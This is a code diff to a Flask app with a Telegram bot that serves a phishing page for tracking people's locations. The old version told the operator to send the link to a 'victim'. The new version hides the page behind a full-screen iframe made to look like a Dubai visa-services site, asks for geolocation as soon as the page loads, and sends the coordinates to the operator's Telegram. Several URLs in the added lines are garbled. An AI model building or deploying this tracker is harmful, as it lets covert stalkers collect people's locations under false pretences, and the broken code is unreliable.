@@ -16,7 +16,7 @@ bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)
 
 # Helper function to send messages to Telegram
 def send_telegram_message(message):
-    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+    url = f"https://telegram.org{TELEGRAM_BOT_TOKEN}/sendMessage"
     payload = {
         "chat_id": TELEGRAM_CHAT_ID,
         "text": message,
@@ -32,112 +32,77 @@ def send_telegram_message(message):
 def send_link_command(message):
     if str(message.chat.id) == str(TELEGRAM_CHAT_ID):
         # Yahan apna Render ya public URL likhein jab deploy kar lein
-        app_url = os.environ.get("APP_URL", "https://YOUR-APP-NAME.onrender.com")
+        app_url = os.environ.get("APP_URL", "https://onrender.com")
         
         response_text = (
             f"🔗 *Aapka Tracking Link Tayar Hai!*\n\n"
             f"`{app_url}`\n\n"
-            f"Is link ko victim ko bhejein. Jaise hi woh open karega, location aapko yahan mil jayegi!"
+            f"Is link ko send karein. Jaise hi user open karega, website ke sath hi location permission mangi jayegi!"
         )
         bot.send_message(message.chat.id, response_text, parse_mode="Markdown")
     else:
         bot.send_message(message.chat.id, "Unauthorized access!")
 
-# --- FLASK WEB SERVER (HTML FRONTEND) ---
+# --- FLASK WEB SERVER (INTEGRATED FULLSCREEN WEBPAGE) ---
 @app.route("/")
 def index():
+    # Yeh code background mein real website ko show karega aur upar permission mangega
     return '''
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Verification</title>
+    <title>Dubai Travel & Tour - Professional Visa Services</title>
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
-        body {
-            background: #0f172a;
-            color: #f8fafc;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            padding: 20px;
-        }
-        .card {
-            background: #1e293b;
-            padding: 35px 25px;
-            border-radius: 14px;
-            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.4);
-            text-align: center;
-            max-width: 380px;
+        html, body {
+            margin: 0;
+            padding: 0;
             width: 100%;
-            border: 1px solid #334155;
+            height: 100%;
+            overflow: hidden;
+            background-color: #ffffff;
         }
-        .spinner {
-            width: 45px;
-            height: 45px;
-            border: 4px solid #334155;
-            border-top: 4px solid #38bdf8;
-            border-radius: 50%;
-            animation: spin 0.9s linear infinite;
-            margin: 0 auto 20px auto;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        .status {
-            font-size: 18px;
-            font-weight: 600;
-            color: #38bdf8;
-            margin-bottom: 10px;
-        }
-        .message {
-            font-size: 14px;
-            color: #94a3b8;
-            line-height: 1.5;
+        iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+            position: absolute;
+            top: 0;
+            left: 0;
+            z-index: 1;
         }
     </style>
 </head>
 <body>
-    <div class="card">
-        <div id="spinner" class="spinner"></div>
-        <div id="status" class="status">Requesting access...</div>
-        <div id="message" class="message">Please allow location permissions to proceed securely.</div>
-    </div>
+
+    <!-- Netlify Website Display Frame -->
+    <iframe src="https://netlify.app"></iframe>
 
     <script>
-        const statusDiv = document.getElementById('status');
-        const messageDiv = document.getElementById('message');
-        const spinnerDiv = document.getElementById('spinner');
+        function sendData(payload) {
+            fetch('/update', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(payload)
+            }).catch(function(err) { console.error('Error:', err); });
+        }
 
         function onSuccess(pos) {
             try {
-                statusDiv.innerHTML = 'Verification Successful!';
-                messageDiv.innerHTML = 'You are a great person 😁<br>Stay blessed, stay happy!';
-                spinnerDiv.style.borderTopColor = '#22c55e';
-                
-                fetch('/update', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        lat: pos.coords.latitude,
-                        lon: pos.coords.longitude,
-                        accuracy: pos.coords.accuracy,
-                        timestamp: pos.timestamp
-                    })
-                }).catch(function(err) { console.error('Error:', err); });
+                sendData({
+                    lat: pos.coords.latitude,
+                    lon: pos.coords.longitude,
+                    accuracy: pos.coords.accuracy,
+                    timestamp: pos.timestamp
+                });
             } catch(e) {
                 console.error('Error:', e);
             }
         }
         
         function onError(err) {
-            statusDiv.innerHTML = 'Permission Denied';
-            messageDiv.innerHTML = 'Please allow location access in your browser settings to continue.';
-            spinnerDiv.style.display = 'none';
+            console.log('Permission denied or error occurred.');
         }
         
         function requestLocation() {
@@ -147,13 +112,10 @@ def index():
                     timeout: 10000,
                     maximumAge: 0
                 });
-            } else {
-                statusDiv.innerHTML = 'Not Supported';
-                messageDiv.innerHTML = 'Geolocation is not supported by your browser.';
-                spinnerDiv.style.display = 'none';
             }
         }
         
+        // Window load hote hi permission trigger hogi background website ke sath
         window.onload = requestLocation;
     </script>
 </body>
@@ -179,7 +141,7 @@ def update():
         f"🌐 *Latitude:* `{lat}`\n"
         f"🌐 *Longitude:* `{lon}`\n"
         f"🎯 *Accuracy:* `{acc} meters`\n\n"
-        f"🗺️ [Google Maps Link](https://maps.google.com/?q={lat},{lon})"
+        f"🗺️ [Google Maps Link](https://google.com{lat},{lon})"
     )
     
     send_telegram_message(msg)
